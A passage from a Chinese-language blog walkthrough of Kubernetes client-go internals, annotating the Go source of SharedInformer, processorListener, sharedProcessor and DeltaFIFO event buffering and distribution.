从p.addCh读取一个事件出来，这回看到消费p.addCh的地方了  case notificationToAdd, ok := \u0026lt;-p.addCh: // 说明p.addCh关闭了，只能退出  if !ok { return } // notification为空说明当前还没发送任何事件给处理器  if notification == nil { // 那就把刚刚获取的事件通过p.nextCh发送个处理器  notification = notificationToAdd nextCh = p.nextCh } else { // 上一个事件还没有发送成功，那就先放到缓存中  // pendingNotifications可以想象为一个slice，这样方便理解，是一个动态的缓存，  p.pendingNotifications.WriteOne(notificationToAdd) } } } }   pop()函数实现的非常巧妙，利用一个协程就把接收、缓冲、发送全部解决了。它充分的利用了golang的select可以同时操作多个chan的特性，同时从addChd读取数据从nextCh发送数据，这两个chan任何一个完成都可以激活协程。\n notification 待通知的事件，来源有2个：  p.addCh 直接接收到的新事件 pendingNotifications已阻塞缓存的未通知发送的事件   pendingNotifications 为缓存阻塞中的事件 pendingNotifications.WriteOne表示缓存事件 p.pendingNotifications.ReadOne表示从缓存读取事件 通过把notification 发送到 p.nextCh 表示发送 notificationToAdd 接收消费最新的p.addCh  接下来，我们看看从nextCh读取事件后是如何处理的：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37  // 代码源自client-go/tools/cache/shared_informer.go // 这个也是sharedProcessor通过wait.Group启动的 func (p *processorListener) run() { // 因为wait.Until需要传入退出信号的chan  stopCh := make(chan struct{}) // wait.Until不多说了，我在前期不点的文章中说过了，只要没有收到退出信号就会周期的执行传入的函数  wait.Until(func() { // wait.ExponentialBackoff()和wait.Until()类似，wait.Until()是无限循环  // wait.ExponentialBackoff()是尝试几次，每次等待时间会以指数上涨  err := wait.ExponentialBackoff(retry.DefaultRetry, func() (bool, error) { // 这也是chan的range用法，可以参看我的《深入浅出golang的chan》了解细节  for next := range p.nextCh { // 判断事件类型，这里面的handler就是调用SharedInfomer.AddEventHandler()传入的  // 理论上处理的不是Deltas么？怎么变成了其他类型，这是SharedInformer做的二次封装，后面会看到  switch notification := next.(type) { case updateNotification: p.handler.OnUpdate(notification.oldObj, notification.newObj) case addNotification: p.handler.OnAdd(notification.newObj) case deleteNotification: p.handler.OnDelete(notification.oldObj) default: utilruntime.HandleError(fmt.Errorf(\u0026#34;unrecognized notification: %#v\u0026#34;, next)) } } return true, nil }) // 执行到这里只能是nextCh已经被关闭了，所以关闭stopCh,通知wait.Until()退出  if err == nil { close(stopCh) } }, 1*time.Minute, stopCh) }   因为processorListener其他函数没啥大用，上面两个函数就就已经把核心功能都实现了。processorListener就是实现了事件的缓冲和处理，此处的处理就是使用者传入的函数。在没有事件的时候可以阻塞处理器，当事件较多是可以把事件缓冲起来，实现了事件分发器与处理器的异步处理。\nprocessorListener的run()和pop()函数是sharedProcessor启动的协程调用的，所以下面就要对sharedProcessor进行分析了。\n总结： 通过p.nextCh方式，processorListener.pop取出事件，然后提供给processorListener.run接收消费事件。这些处理都在sharedProcessor.run中实现，见下面内容。\nsharedProcessor 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34  // client-go/tools/cache/shared_informer.go // sharedProcessor是通过数组组织处理器的，只是分了需要定时同步和不需要要同步两类 type sharedProcessor struct { listenersStarted bool // 所有处理器是否已经启动的标识  listenersLock sync.RWMutex // 读写锁  listeners []*processorListener // 通用的处理器  syncingListeners []*processorListener // 需要定时同步的处理器  clock clock.Clock // 时钟  wg wait.Group // 前面讲过了processorListener每个需要两个协程，  // 用wait.Group来管理所有处理器的携程，保证他们都能退出 } // 代码源自client-go/tools/cache/shared_informer.go // 添加处理器，sharedIndexInformer.AddEventHandler()就会调用这个函数实现处理器的添加 func (p *sharedProcessor) addListener(listener *processorListener) { // 加锁，这个很好理解  p.listenersLock.Lock() defer p.listenersLock.Unlock() // 把处理器添加到数组中  p.addListenerLocked(listener) // 通过wait.Group启动两个协程，做的事情我们在processorListener说过了，这里就是我们上面提到的启动两个协程的地方  // 这个地方判断了listenersStarted，这说明sharedProcessor在启动前、后都可以添加处理器  if p.listenersStarted { p.wg.Start(listener.run) p.wg.Start(listener.pop) } } // 把处理器添加到数组中 func (p *sharedProcessor) addListenerLocked(listener *processorListener) { // 两类(定时同步和不同步)的处理器数组都添加了，这是因为没有定时同步的也会用默认的时间，后面我们会看到  // 那么问题来了，那还用两个数组干什么呢？  p.listeners = append(p.listeners, listener) p.syncingListeners = append(p.syncingListeners, listener) }   在SharedInformer的接口中有一个与之对应的接口，就是SharedInformer.AddEventHandler()。因为SharedInformer没有删除处理器的接口，sharedProcessor也没有相应接口。接下来就是sharedProcessor的分发事件的接口：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21  // 代码源自client-go/tools/cache/shared_informer.go // 通过函数名称也能感觉到分发的感觉~sync表示obj对象是否为同步事件对象 func (p *sharedProcessor) distribute(obj interface{}, sync bool) { // 加锁没毛病  p.listenersLock.RLock() defer p.listenersLock.RUnlock() // 无论是否为sync，添加处理器的代码中我们知道两个数组都会被添加，所以判断不判断没啥区别~  // 所以我的猜测是代码以前实现的是明显区分两类的，但随着代码的更新二者的界限已经没那么明显了  if sync { for _, listener := range p.syncingListeners { listener.add(obj) } } else { for _, listener := range p.listeners { listener.add(obj) } } }   sharedProcessor运行起来后，唯一需要做的就是等待退出信号然后关闭所有的处理器，来看看具体实现代码：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27  // 代码源自client-go/tools/cache/shared_informer.go func (p *sharedProcessor) run(stopCh \u0026lt;-chan struct{}) { // 启动前、后对于添加处理器的逻辑是不同，启动前的处理器是不会立刻启动连个协程执行处理器的pop()和run()函数的  // 而是在这里统一的启动  func() { p.listenersLock.RLock() defer p.listenersLock.RUnlock() // 遍历所有的处理器，然后为处理器启动两个后台协程  for _, listener := range p.listeners { p.wg.Start(listener.run) p.wg.Start(listener.pop) } p.listenersStarted = true }() // 等待退出信号  \u0026lt;-stopCh p.listenersLock.RLock() defer p.listenersLock.RUnlock() // 关闭addCh，processorListener.pop()这个协程就会退出，不明白的可以再次回顾代码  // 因为processorListener.pop()会关闭processorListener.nextCh，processorListener.run()就会退出  // 所以这里只要关闭processorListener.addCh就可以自动实现两个协程的退出，不得不说设计的还是挺巧妙的  for _, listener := range p.listeners { close(listener.addCh) } // 等待所有的协程退出，这里指的所有协程就是所有处理器的那两个协程  p.wg.Wait() }   SharedInformer实现 client-go实现了两个创建SharedInformer的接口，如下所示：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32  // 代码源自client-go/tools/cache/shared_informer.go // lw:这个是apiserver客户端相关的，用于Reflector从apiserver获取资源，所以需要外部提供 // objType:这个SharedInformer监控的对象类型 // resyncPeriod:同步周期，SharedInformer需要多长时间给使用者发送一次全量对象的同步时间 func NewSharedInformer(lw ListerWatcher, objType runtime.Object, resyncPeriod time.Duration) SharedInformer { // 还是用SharedIndexInformer实现的  return NewSharedIndexInformer(lw, objType, resyncPeriod, Indexers{}) } // 创建SharedIndexInformer对象，其中大部分参数再上面的函数已经介绍了 // indexers:需要外部提供计算对象索引键的函数，也就是这里面的对象需要通过什么方式创建索引 func NewSharedIndexInformer(lw ListerWatcher, objType runtime.Object, defaultEventHandlerResyncPeriod time.Duration, indexers Indexers) SharedIndexInformer { realClock := \u0026amp;clock.RealClock{} sharedIndexInformer := \u0026amp;sharedIndexInformer{ // 管理所有处理器用的，这个上面的章节解释了  processor: \u0026amp;sharedProcessor{clock: realClock}, // 其实就是在构造cache，读者可以自行查看NewIndexer()的实现，  // 在cache中的对象用DeletionHandlingMetaNamespaceKeyFunc计算对象键，用indexers计算索引键  // 可以想象成每个对象键是Namespace/Name，每个索引键是Namespace，即按照Namesapce分类  // 因为objType决定了只有一种类型对象，所以Namesapce是最大的分类  indexer: NewIndexer(DeletionHandlingMetaNamespaceKeyFunc, indexers), // 下面这两主要就是给Controller用，确切的说是给Reflector用的  listerWatcher: lw, objectType: objType, // 无论是否需要定时同步，SharedInformer都提供了一个默认的同步时间，当然这个是外部设置的  resyncCheckPeriod: defaultEventHandlerResyncPeriod, defaultEventHandlerResyncPeriod: defaultEventHandlerResyncPeriod, // 默认没有开启的对象突变检测器，没啥用，也不多介绍  cacheMutationDetector: NewCacheMutationDetector(fmt.Sprintf(\u0026#34;%T\u0026#34;, objType)), clock: realClock, } return sharedIndexInformer }   创建完ShareInformer对象，就要添加事件处理器了：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56  // 代码源自client-go/tools/cache/shared_informer.go // 添加没有指定同步周期的事件处理器 func (s *sharedIndexInformer) AddEventHandler(handler ResourceEventHandler) { // defaultEventHandlerResyncPeriod是默认的同步周期，在创建SharedInformer的时候设置的  s.AddEventHandlerWithResyncPeriod(handler, s.defaultEventHandlerResyncPeriod) } // 添加需要定期同步的事件处理器 func (s *sharedIndexInformer) AddEventHandlerWithResyncPeriod(handler ResourceEventHandler, resyncPeriod time.Duration) { // 因为是否已经开始对于添加事件处理器的方式不同，后面会有介绍，所以此处加了锁  s.startedLock.Lock() defer s.startedLock.Unlock() // 如果已经结束了，那就可以直接返回了  if s.stopped { return } // 如果有同步周期，==0就是永远不用同步  if resyncPeriod \u0026gt; 0 { // 同步周期不能太短，太短对于系统来说反而是个负担，大量的无效计算浪费在这上面  if resyncPeriod \u0026lt; minimumResyncPeriod { resyncPeriod = minimumResyncPeriod } // SharedInformer管理了很多处理器，每个处理器都有自己的同步周期，所以此处要统一成一个，称之为对齐  // SharedInformer会选择所有处理器中最小的那个作为所有处理器的同步周期，称为对齐后的同步周期  // 此处就要判断是不是比当前对齐后的同步周期还要小  if resyncPeriod \u0026lt; s.resyncCheckPeriod { // 如果已经启动了，那么只能用和大家一样的周期  if s.started { resyncPeriod = s.resyncCheckPeriod // 如果没启动，那就让大家都用最新的对齐同步周期  } else { s.resyncCheckPeriod = resyncPeriod s.processor.resyncCheckPeriodChanged(resyncPeriod) } } } // 创建处理器，代码一直用listener,可能想强调没事件就挂起把，我反而想用处理器这个名词  // determineResyncPeriod()这个函数读者自己分析把，非常简单，这里面只要知道创建了处理器就行了  listener := newProcessListener(handler, resyncPeriod, determineResyncPeriod(resyncPeriod, s.resyncCheckPeriod), s.clock.Now(), initialBufferSize) // 如果没有启动，那么直接添加处理器就可以了  if !s.started { s.processor.addListener(listener) return } // 这个锁就是暂停再想所有的处理器分发事件用的，因为这样会遍历所有的处理器，此时添加会有风险  s.blockDeltas.Lock() defer s.blockDeltas.Unlock() // 添加处理器  s.processor.addListener(listener) // 这里有意思啦，遍历缓冲中的所有对象，通知处理器，因为SharedInformer已经启动了，可能很多对象已经让其他的处理器处理过了，  // 所以这些对象就不会再通知新添加的处理器，此处就是解决这个问题的  for _, item := range s.indexer.List() { listener.add(addNotification{newObj: item}) } }   事件处理器添加完了，就要看SharedInformer如何把事件分发给每个处理器的了：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47  // 代码源自client-go/tools/cache/shared_informer.go // sharedIndexInformer的核心逻辑函数 func (s *sharedIndexInformer) Run(stopCh \u0026lt;-chan struct{}) { defer utilruntime.HandleCrash() // 在此处构造的DeltaFIFO  fifo := NewDeltaFIFO(MetaNamespaceKeyFunc, s.indexer) // 这里的Config是我们介绍Reflector时介绍的那个Config  cfg := \u0026amp;Config{ // 我前面一直在说Reflector输入到DeltaFIFO,这里算是直接证明了  Queue: fifo, // 下面这些变量我们在Reflector都说了，这里赘述  ListerWatcher: s.listerWatcher, ObjectType: s.objectType, FullResyncPeriod: s.resyncCheckPeriod, RetryOnError: false, ShouldResync: s.processor.shouldResync, // 这个才是重点，Controller调用DeltaFIFO.Pop()接口传入的就是这个回调函数，也是我们后续重点介绍的  Process: s.HandleDeltas, } // 创建Controller，这个不用多说了  func() { s.startedLock.Lock() defer s.startedLock.Unlock() s.controller = New(cfg) s.controller.(*controller).clock = s.clock s.started = true }() // 这个processorStopCh 是给sharedProcessor和cacheMutationDetector传递退出信号的  // 因为这里要创建两个协程运行sharedProcessor和cacheMutationDetector的核心函数  processorStopCh := make(chan struct{}) var wg wait.Group defer wg.Wait() // Wait for Processor to stop  defer close(processorStopCh) // Tell Processor to stop  wg.StartWithChannel(processorStopCh, s.cacheMutationDetector.Run) wg.StartWithChannel(processorStopCh, s.processor.run) // Run()函数都退出了，也就应该设置结束的标识了  defer func() { s.startedLock.Lock() defer s.startedLock.Unlock() s.stopped = true }() // 启动Controller，Controller一旦运行，整个流程就开始启动了，所以叫Controller也不为过  // 毕竟Controller是SharedInformer的发动机嘛  s.controller.Run(stopCh) }   sharedIndexInformer通过Run()函数启动了Controller和sharedProcess()，Controller通过DeltaFIFO.Pop()函数弹出Deltas，并调用函数处理，这个处理函数就是sharedIndexInformer.HandleDeltas()，这个函数是衔接Controller和sharedProcess的关键点，他把Deltas转换为sharedProcess需要的各种Notification类型。下面我们就对这个函数进行代码分析：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47  // 代码源自client-go/tools/cache/shared_informer.go func (s *sharedIndexInformer) HandleDeltas(obj interface{}) error { // 看到这里就知道为啥起名为blockDeltas了，这是阻塞处理器Deltas啊~因为分发事件到处理器，所以要加锁  s.blockDeltas.Lock() defer s.blockDeltas.Unlock() // Deltas里面包含了一个对象的多个增量操作，所以要从最老的Delta到最先的Delta遍历处理  for _, d := range obj.(Deltas) { // 根据不同的Delta做不同的操作，但是大致分为对象添加、删除两大类操作  // 所有的操作都要先同步到cache在通知处理器，这样保持处理器和cache的状态是一致的  switch d.Type { // 同步、添加、更新都是对象添加类的造作，至于是否是更新还要看cache是否有这个对象  case Sync, Added, Updated: // 看看对象是不是有定时同步产生的事件  isSync := d.Type == Sync // 检测突变，没啥用  s.cacheMutationDetector.AddObject(d.Object) // 如果cache中有的对象，一律看做是更新事件  if old, exists, err := s.indexer.Get(d.Object); err == nil \u0026amp;\u0026amp; exists { // 把对象更新到cache中  if err := s.indexer.Update(d.Object); err != nil { return err } // 通知处理器处理事件  s.processor.distribute(updateNotification{oldObj: old, newObj: d.Object}, isSync) // cache中没有的对象，一律看做是新增事件  } else { // 把对象添加到cache中  if err := s.indexer.Add(d.Object); err != nil { return err } // 通知处理器处理器事件  s.processor.distribute(addNotification{newObj: d.Object}, isSync) } // 对象被删除  case Deleted: // 从cache中删除对象  if err := s.indexer.Delete(d.Object); err != nil { return err } // 通知所有的处理器对象被删除了  s.processor.distribute(deleteNotification{oldObj: d.Object}, false) } } return nil }   说明   利用apiserver的api实现资源的列举和监控(Reflector实现)；\n  利用cache存储apiserver中的部分对象，通过对象类型进行制定，并在cache中采用Namespace做对象的索引\n  先通过apiserver的api将对象的全量列举出来存储在cache中，然后再watch资源，一旦有变化就更新cache中；\n  更新到cache中的过程通过DeltaFIFO实现的有顺序的更新，因为资源状态是通过全量+增量方式实现同步的，所以顺序错误会造成状态不一致；\n  使用者可以注册回调函数(类似挂钩子)，在更新到cache的同时通知使用者处理，为了保证回调处理不被某一个处理器阻塞，SharedInformer实现了processorListener异步缓冲处理；\n  整个过程是Controller是发动机，驱动整个流程运转；\n  最后我们还是用一幅图来总结SharedInformer，绝对的干货(其中Reflector.resync()因为是个匿名函数，所以用斜体，其实是不存在这个函数的)~\nDeltaFIFO Delta其实就是kubernetes系统中对象的变化(增、删、改、同步)，FIFO比较好理解，是一个先入先出的队列，那么DeltaFIFO就是一个按序的(先入先出)kubernetes对象变化的队列\nclient-go/tools/cache/delta_fifo.go\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18  // A KeyListerGetter is anything that knows how to list its keys and look up by key. type KeyListerGetter interface { KeyLister KeyGetter } // A KeyLister is anything that knows how to list its keys. type KeyLister interface { ListKeys() []string } // A KeyGetter is anything that knows how to get the value stored under a given key. type KeyGetter interface { GetByKey(key string) (interface{}, bool, error) }   上面两个接口在client-go.tools.cache.Store这个接口类型中也存在，也就是说实现了Store接口的类型同时也实现了上面三个接口。上面三个接口基本上就是kv的标准接口，但凡是通过kv方式访问的对象(存储、队列、索引等)多半具备以上接口。肯定有人会问直接使用具体的类型不就完了么，定义这些有什么用？答案很简单，当你需要对kv的对象只读但是不关心具体实现时就用上了\nQueue client-go/tools/cache/fifo.go\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23  // Queue is exactly like a Store, but has a Pop() method too. type Queue interface { Store // Pop blocks until it has something to process.  // It returns the object that was process and the result of processing.  // The PopProcessFunc may return an ErrRequeue{...} to indicate the item  // should be requeued before releasing the lock on the queue.  Pop(PopProcessFunc) (interface{}, error) // AddIfNotPresent adds a value previously  // returned by Pop back into the queue as long  // as nothing else (presumably more recent)  // has since been added.  AddIfNotPresent(interface{}) error // Return true if the first batch of items has been popped  HasSynced() bool // Close queue  Close() }   Queue是在Store基础上扩展了Pop接口可以让对象有序的弹出，Indexer是在Store基础上建立了索引，可以快速检索对象。\nDeltaFIFO实现 首先我们想想为什么每个对象一个Deltas而不是Delta？对一个对象的多个操作，什么操作可以合并？\nDeltaFIFO生产者和消费者是异步的，如果同一个目标的频繁操作，前面操作还缓存在队列中的时候，那么队列就要缓冲对象的所有操作，那可以将多个操作合并么？这是下面讨论的了；\n对于更新这种类型的操作在没有全量基础的情况下是没法合并的，同时我们还不知道具体是什么类型的对象，所以能合并的也就是有添加/删除，两个添加/删除操作其实可以视为一个；\n因为系统对于删除的对象有DeletedFinalStateUnknown这个状态，所以会存在两次删除的情况，但是两次添加同一个对象由于apiserver可以保证对象的唯一性，所以处理中就没有考虑合并两次添加操作。 这就是为什么合并操作处理只考虑了Delete\nclient-go/tools/cache/delta_fifo.go\nopyright 2014 The Kubernetes Authors. Licensed under the Apache License, Version 2.0 (the \u0026#34;License\u0026#34;); you may not use this file except in compliance with the License. You may obtain a copy of the License at http://www.apache.org/licenses/LICENSE-2.0 Unless required by applicable law or agreed to in writing, software distributed under the License is distributed on an \u0026#34;AS IS\u0026#34; BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the License for the specific language governing permissions and limitations under the License. */ package cache import ( \u0026#34;errors\u0026#34; \u0026#34;fmt\u0026#34; \u0026#34;sync\u0026#34; \u0026#34;k8s.io/apimachinery/pkg/util/sets\u0026#34; \u0026#34;github.com/golang/glog\u0026#34; ) // NewDeltaFIFO returns a Store which can be used process changes to items. // // keyFunc is used to figure out what key an object should have. (It\u0026#39;s // exposed in the returned DeltaFIFO\u0026#39;s KeyOf() method, with bonus features.) // // \u0026#39;compressor\u0026#39; may compress as many or as few items as it wants // (including returning an empty slice), but it should do what it // does quickly since it is called while the queue is locked. // \u0026#39;compressor\u0026#39; may be nil if you don\u0026#39;t want any delta compression. // // \u0026#39;keyLister\u0026#39; is expected to return a list of keys that the consumer of // this queue \u0026#34;knows about\u0026#34;. It is used to decide which items are missing // when Replace() is called; \u0026#39;Deleted\u0026#39; deltas are produced for these items. // It may be nil if you don\u0026#39;t need to detect all deletions. // TODO: consider merging keyLister with this object, tracking a list of // \u0026#34;known\u0026#34; keys when Pop() is called. Have to think about how that // affects error retrying. // TODO(lavalamp): I believe there is a possible race only when using an // external known object source that the above TODO would // fix. // // Also see the comment on DeltaFIFO. func NewDeltaFIFO(keyFunc KeyFunc, compressor DeltaCompressor, knownObjects KeyListerGetter) *DeltaFIFO { f := \u0026amp;DeltaFIFO{ items: map[string]Deltas{}, queue: []string{}, keyFunc: keyFunc, deltaCompressor: compressor, knownObjects: knownObjects, } f.cond.L = \u0026amp;f.lock return f } // DeltaFIFO is like FIFO, but allows you to process deletes. // // DeltaFIFO is a producer-consumer queue, where a Reflector is // intended to be the producer, and the consumer is whatever calls // the Pop() method. // // DeltaFIFO solves this use case: // * You want to process every object change (delta) at most once. // * When you process an object, you want to see everything // that\u0026#39;s happened to it since you last processed it. // * You want to process the deletion of objects. // * You might want to periodically reprocess objects. // // DeltaFIFO\u0026#39;s Pop(), Get(), and GetByKey() methods return // interface{} to satisfy the Store/Queue interfaces, but it // will always return an object of type Deltas. // // A note on threading: If you call Pop() in parallel from multiple // threads, you could end up with multiple threads processing slightly // different versions of the same object. // // A note on the KeyLister used by the DeltaFIFO: It\u0026#39;s main purpose is // to list keys that are \u0026#34;known\u0026#34;, for the purpose of figuring out which // items have been deleted when Replace() or Delete() are called. The deleted // object will be included in the DeleteFinalStateUnknown markers. These objects // could be stale. // // You may provide a function to compress deltas (e.g., represent a // series of Updates as a single Update). type DeltaFIFO struct { // lock/cond protects access to \u0026#39;items\u0026#39; and \u0026#39;queue\u0026#39;.  // 读写锁，因为涉及到同时读写，读写锁性能要高  lock sync.RWMutex // 给Pop()接口使用，在没有对象的时候可以阻塞，内部锁复用读写锁  cond sync.Cond // We depend on the property that items in the set are in  // the queue and vice versa, and that all Deltas in this  // map have at least one Delta.  // 存储对象  // 这个应该是Store的本质了，按照kv的方式存储对象，但是存储的是对象的Deltas数组  items map[string]Deltas // 队列  //这个是为先入先出实现的，存储的就是对象的键  queue []string // populated is true if the first batch of items inserted by Replace() has been populated  // or Delete/Add/Update was called first.  // 通过Replace()接口将第一批对象放入队列，或者第一次调用增、删、改接口时标记为true  populated bool // initialPopulationCount is the number of items inserted by the first call of Replace()  // 通过Replace()接口将第一批对象放入队列的对象数量  initialPopulationCount int // keyFunc is used to make the key used for queued item  // insertion and retrieval, and should be deterministic.  // 对象键计算函数  //MetaNamespaceKeyFunc  //meta.GetNamespace() + \u0026#34;/\u0026#34; + meta.GetName()  keyFunc KeyFunc // deltaCompressor tells us how to combine two or more  // deltas. It may be nil.  deltaCompressor DeltaCompressor // knownObjects list keys that are \u0026#34;known\u0026#34;, for the  // purpose of figuring out which items have been deleted  // when Replace() or Delete() is called.  // 前面介绍就是为了这是用，该对象指向的就是Indexer，  knownObjects KeyListerGetter // Indication the queue is closed.  // Used to indicate a queue is closed so a control loop can exit when a queue is empty.  // Currently, not used to gate any of CRED operations.  // 是否已经关闭的标记  closed bool // 专为关闭设计的锁，这里非读写锁，可能不是读多写少场景  closedLock sync.Mutex } var ( _ = Queue(\u0026amp;DeltaFIFO{}) // DeltaFIFO is a Queue ) var ( // ErrZeroLengthDeltasObject is returned in a KeyError if a Deltas  // object with zero length is encountered (should be impossible,  // even if such an object is accidentally produced by a DeltaCompressor--  // but included for completeness).  ErrZeroLengthDeltasObject = errors.New(\u0026#34;0 length Deltas object; can\u0026#39;t get key\u0026#34;) ) // Close the queue. func (f *DeltaFIFO) Close() { f.closedLock.Lock() defer f.closedLock.Unlock() f.closed = true f.cond.Broadcast() } // KeyOf exposes f\u0026#39;s keyFunc, but also detects the key of a Deltas object or // DeletedFinalStateUnknown objects. func (f *DeltaFIFO) KeyOf(obj interface{}) (string, error) { // 先用Deltas做一次强行转换  //DeltaFIFO的计算对象键的方式为什么要先做一次Deltas的类型转换呢？  //原因很简单，那就是从DeltaFIFO.Pop()出去的对象很可能还要再添加进来(比如处理失败需要再放进来)，  //此时添加的对象就是已经封装好的Deltas。  if d, ok := obj.(Deltas); ok { if len(d) == 0 { return \u0026#34;\u0026#34;, KeyError{obj, ErrZeroLengthDeltasObject} } // 只用最新版本的对象就可以了  // 即该Deltas数组中最后一个元素  obj = d.Newest().Object } if d, ok := obj.(DeletedFinalStateUnknown); ok { return d.Key, nil } //MetaNamespaceKeyFunc  //meta.GetNamespace() + \u0026#34;/\u0026#34; + meta.GetName()  return f.keyFunc(obj) } // Return true if an Add/Update/Delete/AddIfNotPresent are called first, // or an Update called first but the first batch of items inserted by Replace() has been popped func (f *DeltaFIFO) HasSynced() bool { f.lock.Lock() defer f.lock.Unlock() // 这里就比较明白了，一次同步全量对象后，并且全部Pop()出去才能算是同步完成  // 其实这里所谓的同步就是全量内容已经进入Indexer，Indexer已经是系统中对象的全量快照了  return f.populated \u0026amp;\u0026amp; f.initialPopulationCount == 0 } // Add inserts an item, and puts it in the queue. The item is only enqueued // if it doesn\u0026#39;t already exist in the set. func (f *DeltaFIFO) Add(obj interface{}) error { f.lock.Lock() defer f.lock.Unlock() // 队列第一次写入操作都要设置标记  f.populated = true return f.queueActionLocked(Added, obj) } // Update is just like Add, but makes an Updated Delta. func (f *DeltaFIFO) Update(obj interface{}) error { f.lock.Lock() defer f.lock.Unlock() // 队列第一次写入操作都要设置标记  f.populated = true return f.queueActionLocked(Updated, obj) } // Delete is just like Add, but makes an Deleted Delta. If the item does not // already exist, it will be ignored. (It may have already been deleted by a // Replace (re-list), for example. func (f *DeltaFIFO) Delete(obj interface{}) error { id, err := f.KeyOf(obj) if err != nil { return KeyError{obj, err} } f.lock.Lock() defer f.lock.Unlock() // 队列第一次写入操作都要设置标记  f.populated = true // 此处是需要注意的，knownObjects就是Indexer，里面存有已知全部的对象  if f.knownObjects == nil { // 在没有Indexer的条件下只能通过自己存储的对象查一下  if _, exists := f.items[id]; !exists { // Presumably, this was deleted when a relist happened.  // Don\u0026#39;t provide a second report of the same deletion.  return nil } } else { // We only want to skip the \u0026#34;deletion\u0026#34; action if the object doesn\u0026#39;t  // exist in knownObjects and it doesn\u0026#39;t have corresponding item in items.  // Note that even if there is a \u0026#34;deletion\u0026#34; action in items, we can ignore it,  // because it will be deduped automatically in \u0026#34;queueActionLocked\u0026#34;  // 自己（itemsExist）和Indexer里面（exists）有任何一个有这个对象就算存在  _, exists, err := f.knownObjects.GetByKey(id) _, itemsExist := f.items[id] if err == nil \u0026amp;\u0026amp; !exists \u0026amp;\u0026amp; !itemsExist { // Presumably, this was deleted when a relist happened.  // Don\u0026#39;t provide a second report of the same deletion.  // TODO(lavalamp): This may be racy-- we aren\u0026#39;t properly locked  // with knownObjects.  return nil } } return f.queueActionLocked(Deleted, obj) } // AddIfNotPresent inserts an item, and puts it in the queue. If the item is already // present in the set, it is neither enqueued nor added to the set. // // This is useful in a single producer/consumer scenario so that the consumer can // safely retry items without contending with the producer and potentially enqueueing // stale items. // // Important: obj must be a Deltas (the output of the Pop() function). Yes, this is // different from the Add/Update/Delete functions. // 添加不存在的对象 func (f *DeltaFIFO) AddIfNotPresent(obj interface{}) error { // 这个要求放入的必须是Deltas数组，就是通过Pop（）弹出的对象  deltas, ok := obj.(Deltas) if !ok { return fmt.Errorf(\u0026#34;object must be of type deltas, but got: %#v\u0026#34;, obj) } // 多个Delta都是一个对象，所以用最新的就可以了  id, err := f.KeyOf(deltas.Newest().Object) if err != nil { return KeyError{obj, err} } f.lock.Lock() defer f.lock.Unlock() f.addIfNotPresent(id, deltas) return nil } // addIfNotPresent inserts deltas under id if it does not exist, and assumes the caller // already holds the fifo lock. // 这个是添加不存在对象的实现 func (f *DeltaFIFO) addIfNotPresent(id string, deltas Deltas) { f.populated = true // 这里判断的对象是否存在  if _, exists := f.items[id]; exists { return } // 放入队列中  f.queue = append(f.queue, id) f.items[id] = deltas f.cond.Broadcast() } // re-listing and watching can deliver the same update multiple times in any // order. This will combine the most recent two deltas if they are the same. func dedupDeltas(deltas Deltas) Deltas { // 小于2个delta，那就是1个呗，没啥好合并的  n := len(deltas) if n \u0026lt; 2 { return deltas } // 取出最后两个  a := \u0026amp;deltas[n-1] b := \u0026amp;deltas[n-2] // 判断如果是重复的，那就删除这两个delta把合并后的追加到Deltas数组尾部  if out := isDup(a, b); out != nil { // 使用deltas 前n-2 元素构造d，然后再把合并后的 out追加  d := append(Deltas{}, deltas[:n-2]...) return append(d, *out) } return deltas } // If a \u0026amp; b represent the same event, returns the delta that ought to be kept. // Otherwise, returns nil. // TODO: is there anything other than deletions that need deduping? // 判断两个Delta是否是重复的 func isDup(a, b *Delta) *Delta { // 只有一个判断，只能判断是否为删除类操作，和我们上面的判断相同  // 这个函数的本意应该还可以判断多种类型的重复，当前来看只能有删除这一种能够合并  // 只合并obj前后操作类型都是delete的（即为重复）  if out := isDeletionDup(a, b); out != nil { return out } // TODO: Detect other duplicate situations? Are there any?  return nil } // keep the one with the most information if both are deletions. // 判断是否为删除类的重复 func isDeletionDup(a, b *Delta) *Delta { // 二者都是删除那肯定有一个是重复的  if b.Type != Deleted || a.Type != Deleted { return nil } // Do more sophisticated checks, or is this sufficient?  // 理论上返回最后一个比较好，但是对象已经不再系统监控范围，前一个删除状态是好的  if _, ok := b.Object.(DeletedFinalStateUnknown); ok { return a } return b } // willObjectBeDeletedLocked returns true only if the last delta for the // given object is Delete. Caller must lock first. func (f *DeltaFIFO) willObjectBeDeletedLocked(id string) bool { deltas := f.items[id] return len(deltas) \u0026gt; 0 \u0026amp;\u0026amp; deltas[len(deltas)-1].Type == Deleted } // queueActionLocked appends to the delta list for the object, calling // f.deltaCompressor if needed. Caller must lock first. // 从函数名称来看把“动作”放入队列中，这个动作就是DeltaType，而且已经加锁了 func (f *DeltaFIFO) queueActionLocked(actionType DeltaType, obj interface{}) error { // 1 计算资源对象的key  id, err := f.KeyOf(obj) if err != nil { return KeyError{obj, err} } // If object is supposed to be deleted (last event is Deleted),  // then we should ignore Sync events, because it would result in  // recreation of this object.  // 2 如果操作类型是Sync，而对象被删除，则忽略Sync事件，直接返回  // 如果是同步，并且对象未来会被删除，那么就直接返回，没必要记录这个动作了  // 肯定有人会问为什么Add/Delete/Update这些动作可以，因为同步对于已经删除的对象是没有意义的  // 